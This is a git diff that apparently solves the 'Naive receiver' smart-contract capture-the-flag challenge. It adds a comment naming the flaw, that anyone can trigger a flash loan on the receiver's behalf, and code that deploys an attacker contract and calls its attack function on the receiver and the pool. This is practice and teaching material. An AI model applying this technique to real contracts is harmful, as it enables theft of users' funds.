@@ -30,7 +30,18 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: anyone can call flashLoan function with receiver contract's address
+         * */
+        
+        // this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+
+        const NaiveReceiverChallenge = await ethers.getContractFactory("NaiveReceiverChallenge", attacker);
+        const nrc = await NaiveReceiverChallenge.deploy();
+        await nrc.deployed();
+
+        nrc.attack(this.receiver.address, this.pool.address);
     });
 
     after(async function () {
